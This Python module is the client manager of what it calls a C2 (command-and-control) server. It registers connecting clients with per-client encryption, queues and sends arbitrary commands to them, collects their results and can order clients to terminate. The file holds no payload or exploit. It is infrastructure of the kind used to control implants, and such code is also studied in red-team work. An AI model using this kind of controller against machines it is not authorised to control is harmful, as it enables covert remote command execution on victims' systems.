"""
Client Manager for C2 Server
Handles client lifecycle management following SOLID principles
"""

import asyncio
import logging
import time
import uuid
from typing import Dict, List, Optional
from .client_state import ClientState
from .message import Message
from .message_type import MessageType
from .command_type import CommandType
from .send_receive_msgs import send_message, receive_message

logger = logging.getLogger(__name__)


class ClientManager:
    """Manages client lifecycle - registration, communication, cleanup"""
    
    def __init__(self):
        self.clients: Dict[str, ClientState] = {}
        self._shutdown_event = asyncio.Event()
    
    def set_shutdown_event(self, event: asyncio.Event):
        """Set the shutdown event for coordinated shutdown"""
        self._shutdown_event = event
    
    async def register_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> Optional[ClientState]:
        """Register a new client connection"""
        try:
            msg = await receive_message(reader)
            msg = Message.from_payload(msg)
            
            if not msg or msg.type is not MessageType.REGISTER:
                logger.warning(f"Invalid registration message: {msg.type}")
                writer.close()
                return None
            
            client_id = msg.client_id
            client_state = ClientState(client_id, reader, writer)
            
            # Setup client-specific encryption
            server_public_key = client_state.setup_encryption(msg.command)
            logger.info(f"Encryption setup for client: {client_id}")
            
            self.clients[client_id] = client_state
            logger.info(f"Client registered: {client_id}")
            
            # Send acknowledgment with server's public key
            await send_message(writer, Message.as_ack(client_id, server_public_key).to_payload(True))
            
            return client_state
            
        except Exception as e:
            logger.error(f"Client registration error: {e}")
            return None
    
    def get_client(self, client_id: str) -> Optional[ClientState]:
        """Get client by ID"""
        return self.clients.get(client_id)
    
    def list_clients(self) -> Dict[str, ClientState]:
        """Get all clients"""
        return self.clients.copy()
    
    def add_command_to_queue(self, client_id: str, command: str) -> bool:
        """Add command to client's queue"""
        if client_id not in self.clients:
            return False
        
        cmd_id = str(uuid.uuid4())
        client_state = self.clients[client_id]
        client_state.command_queue.put_nowait({
            "cmd_id": cmd_id,
            "command": command,
        })
        return True
    
    def kill_client(self, client_id: str) -> bool:
        """Send kill command to client"""
        if client_id not in self.clients:
            return False
        
        if self.add_command_to_queue(client_id, CommandType.KILL.value):
            self.clients[client_id].set_killing()
            return True
        return False
    
    async def handle_client_loop(self, client_state: ClientState):
        """Handle the main client communication loop"""
        try:
            cid = client_state.client_id
            tasks = [
                asyncio.create_task(self._command_receiver(client_state)),
                asyncio.create_task(self._command_executor(client_state)),
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info(f"[{cid}] Client loop cancelled")
        except Exception as e:
            logger.error(f"[{cid}] Client loop error: {e}")
        finally:
            await self._cancel_tasks(cid, tasks)
    
    async def _command_receiver(self, client_state: ClientState):
        """Receive messages from client"""
        cid = client_state.client_id
        try:
            while True:
                if not client_state.is_connected:
                    await self._handle_killed_client(client_state)
                    logger.info(f'[{cid}] Receiver stopped | Client not connected')
                    break
                
                msg = await receive_message(client_state.reader)
                if not msg:
                    logger.warning(f"[{cid}] Received an empty message")
                    break
                
                if self._shutdown_event.is_set():
                    logger.info(f'[{cid}] Receiver stopped | shutdown event detected')
                    break
                
                msg = client_state.decrypt_message(msg)
                if not msg:
                    logger.warning(f"[{cid}] Failed to decrypt message")
                    break
                
                if msg.type is not MessageType.RESULT:
                    logger.warning(f"[{cid}] Unknown message type: {msg.type}")
                    continue

                logger.info(f"[{cid}] Result: {msg.result}")
                if msg.cmd_id in client_state.pending_results:
                    del client_state.pending_results[msg.cmd_id]
                    
                    if not client_state.is_killing:
                        continue
                    if client_state.pending_results:
                        logger.info(f"[{cid}] Couldn't wait for {len(client_state.pending_results)} results")
                    client_state.set_killed()
                    break
                    # client_state.pending_results.clear()
                    # self._drain_queue(client_state.command_queue)
                    # client_state.set_killed()
                    # client_state.command_queue.put_nowait(None)
                    # logger.info(f"[{cid}] Client set killed and queue got None")
        
        except asyncio.CancelledError:
            logger.info(f"[{cid}] Command receiver cancelled")
        except asyncio.IncompleteReadError:
            logger.info(f"[{cid}] Connection closed")
            if client_state.is_connected:
                client_state.set_disconnected()
                logger.info(f"[{cid}] Client disconnected")
            else:
                client_state.set_killed()
                logger.info(f"[{cid}] Client killed")
        except Exception as e:
            logger.error(f"[{cid}] Command receiver error: {e}")
        finally:
            client_state.pending_results.clear()
            self._drain_queue(client_state.command_queue)
            client_state.command_queue.put_nowait(None)
    
    async def _command_executor(self, client_state: ClientState):
        """Execute commands queued for client"""
        cid = client_state.client_id
        try:
            while True:
                if not client_state.is_connected:
                    await self._handle_killed_client(client_state)
                    logger.info(f'[{cid}] Executor stopped | Client not connected')
                    break
                
                cmd_data = await client_state.command_queue.get()
                if cmd_data is None:
                    continue
                if self._shutdown_event.is_set():
                    logger.info(f'[{cid}] Executor stopped | Shutdown event detected')
                    break
                
                cmd_id = cmd_data.get("cmd_id")
                command = cmd_data.get("command")
                logger.info(f"[{cid}] Executing command: {command}")
                if command == CommandType.KILL.value:
                    self._drain_queue(client_state.command_queue)
                    client_state.pending_results.clear()
                
                client_state.pending_results[cmd_id] = command
                msg = Message.as_command(cmd_id, command)
                msg = client_state.encrypt_message(msg)
                
                await send_message(client_state.writer, msg)
                logger.info(f"[{cid}] Command sent: {command}")
        
        except asyncio.CancelledError:
            logger.info(f"[{cid}] Command executor cancelled")
        except Exception as e:
            logger.error(f"[{cid}] Command executor error: {e}")

    @staticmethod
    def _drain_queue(queue):
        # TODO: make global helper function
        try:
            while not queue.empty():
                cmd_data = queue.get_nowait()
                queue.task_done()
                logger.info(f"Drained command: {cmd_data.get('command', '')}")
            logger.info("Drained command queue")
        except asyncio.QueueEmpty:
            logger.info("Command queue is empty")
    
    async def _handle_killed_client(self, client_state: ClientState):
        """Handle killed client connection"""
        logger.info(f"[{client_state.client_id}] Handling killed client")
        if not client_state.is_killed:
            return
        if not client_state.writer or client_state.writer.is_closing():
            return
        
        logger.info(f"[{client_state.client_id}] Closing writer for killed client")
        client_state.reader.feed_eof()
        client_state.writer.close()
        try:
            await asyncio.wait_for(client_state.writer.wait_closed(), timeout=1.0)
        except asyncio.TimeoutError:
            logger.info(f"[{client_state.client_id}] Timeout waiting for writer to close")
        except Exception as e:
            logger.error(f"[{client_state.client_id}] Error closing writer: {e}")
        
        client_state.writer = None
        client_state.reader = None
        logger.info(f"[{client_state.client_id}] Closed writer for killed client")
    
    async def close_all_clients(self):
        """Close all client connections"""
        for cid, client_state in self.clients.items():
            if client_state.writer and not client_state.writer.is_closing():
                client_state.writer.close()
                try:
                    await asyncio.wait_for(client_state.writer.wait_closed(), timeout=1.0)
                    logger.info(f"[{cid}] Closed writer")
                except asyncio.TimeoutError:
                    logger.info(f"[{cid}] Timeout waiting for writer to close")
        self.clients.clear()
    
    @staticmethod
    async def _cancel_tasks(client_id: str, tasks: List[asyncio.Task]) -> None:
        """Cancel all tasks gracefully"""
        try:
            for task in tasks:
                if not task.done():
                    task.cancel()
            logger.info(f"[{client_id}] All tasks cancelled")
        except Exception as e:
            logger.error(f"[{client_id}] Error cancelling tasks: {e}")
    
    def print_client_list(self):
        """Print formatted client list"""
        if not self.clients:
            print("No clients connected")
            return
        
        print("\n" + "="*60)
        print(f"{'Client ID':<20} {'Status':<12} {'Last HB':<12}")
        print("="*60)
        
        for client_id, state in self.clients.items():
            last_hb = time.time() - state.last_heartbeat
            hb_str = f"{last_hb:.1f}s ago"
            print(f"{client_id:<20} {state.status:<12} {hb_str:<12}")
        
        print("="*60 + "\n")